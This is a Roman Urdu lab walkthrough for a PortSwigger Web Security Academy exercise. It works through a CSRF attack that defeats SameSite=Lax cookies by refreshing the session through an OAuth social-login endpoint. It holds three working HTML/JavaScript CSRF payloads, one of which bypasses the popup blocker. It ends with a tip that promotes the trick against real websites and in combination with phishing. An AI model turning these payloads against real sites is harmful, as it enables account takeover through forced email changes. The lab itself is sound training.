## 🔧 Step-by-step Lab Solve Karne ka Tariqa:

### **1. Login and Analyze Request**

* Burp browser open karo.
* Lab open karo aur `wiener:peter` se login karo via **OAuth login (social media)**.
* Apne email ko change karo (e.g., `test@burp.com`).
* Burp Suite → **Proxy > HTTP History** → check karo `POST /my-account/change-email` request.

  * Dekho koi **CSRF token** nahi hai? ✔️ Vulnerable to CSRF.
* **Session cookie** `SameSite=Lax` hai (browser default), iss ka matlab:

  * Cross-site `GET` requests main cookie jati hai.
  * Cross-site `POST` requests main nahi jati **agar session refresh na ho**.

---

### **2. Basic CSRF Exploit Test Karo**

* Exploit server open karo.
* Yeh code paste karo (replace `YOUR-LAB-ID`):

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="test@attacker.com" />
</form>
<script>
  document.forms[0].submit();
</script>
```

* “Store” aur “View exploit” karo.
* Lekin attack **fail ho jayega** kyunki SameSite=Lax cookie nahi gayi hogi.

---

### **3. Session Cookie Refresh Trick (via social-login)**

Jab `/social-login` ko visit karte ho, OAuth session refresh hota hai aur **new session cookie set hoti hai**.

Toh:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<script>
  window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
  setTimeout(changeEmail, 5000);

  function changeEmail(){
    document.forms[0].submit();
  }
</script>
```

⚠️ Problem: Popup blocker is window ko block kar dega.

---

### **4. Popup Blocker Bypass (User Interaction Trick)**

Browser popup tabhi allow karta hai jab user click kare. Is liye code main yeh add karo:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="victim@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
  window.onclick = () => {
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);
  }

  function changeEmail() {
    document.forms[0].submit();
  }
</script>
```

### **5. Attack Deliver Karo**

* “Store” karo exploit.
* “View exploit” → click anywhere on the page → session refresh ho jaye ga.
* Email change request jaaye gi with fresh cookie.
* Apne account page check karo, email change ho gaya? ✔️
* Ab `victim@...` ko kisi aur email se replace karo (jo tumhara na ho) and **Deliver exploit to victim**.

---

## ✅ Lab Solved!

---

### 🔐 Penetration Testing Tip:

Yeh SameSite bypass ka trick real-life websites main useful hai jab OAuth flows use hote hain — specially jab cookie refresh ho jati hai bina user ke notice kiye. Yeh trick tum phishing + CSRF combine karne ke liye bhi use kar sakte ho.

---
